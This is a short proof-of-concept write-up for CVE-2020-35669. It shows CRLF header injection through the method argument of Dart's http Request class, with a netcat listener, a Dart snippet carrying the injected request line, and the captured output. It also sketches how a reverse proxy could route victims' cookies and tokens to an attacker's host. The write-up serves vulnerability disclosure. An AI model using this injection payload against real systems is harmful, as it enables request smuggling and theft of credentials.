# [CVE-2020-35669](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35669)

## dummy server
please run dummy server using 1st terminal
```bash
sudo nc -l 127.0.0.1 80 
```

## apply given diff
```diff
diff --git a/main.dart b/main.dart
index 8c78291..a46f4d0 100644
--- a/main.dart
+++ b/main.dart
@@ -4,7 +4,7 @@ import 'package:http/src/request.dart';
 void main() async {
   var r = Request(
       "GET http://example.com/ HTTP/1.1\r\nHost: example.com\r\nLLAMA:",
-      Uri(scheme: "http", path: "/llama", host: "google.com"));
+      Uri(scheme: "http", path: "/llama", host: "localhost"));
   var rs = await r.send();
   var resp = await Response.fromStream(rs);
   print('${resp.body}');

```

## run dummy app
please execute `main.dart` using 2nd terminal
```bash
dart run main.dart
```

## result
nc should recieve given request
```http
GET HTTP://EXAMPLE.COM/ HTTP/1.1
HOST: EXAMPLE.COM
LLAMA: /llama HTTP/1.1
user-agent: Dart/2.10 (dart:io)
accept-encoding: gzip
content-length: 0
host: localhost
```

### Important piece of code
```dart
  var r = Request(
      "GET http://example.com/ HTTP/1.1\r\nHost: example.com\r\nLLAMA:",
      Uri(scheme: "http", path: "/llama", host: "google.com"));
  var rs = await r.send();
```

## Critical path

Assuming `diff` showed above was not applied and **user is behind `rev-proxy`** Website served by `example.com` was reached.
```bash
dart run main.dart
<!doctype html>
<html>
<head>
    <title>Example Domain</title>

    <meta charset="utf-8" />
    ...
    ... blah blah blah
    ...

```
### Why this is a security risk
If the developer is using Request to abstract generating HTTP calls and he's accepting a method param from the user, the user can do some magic like header injection or path forgery.
This can be exploited in many ways and seems to be quite important especially in case there is a reverse proxy is in place. A proxy may just pass someone's request to any host base on `host` header. 
Let's assume I'm replacing example.com with my-evil-uservice.org and the victim is working in a company behind the proxy. This means I can redirect calls with headers/cookies(tokens) and blah blah blah. Base on this, stealing calls with all headers/cookies can happen.
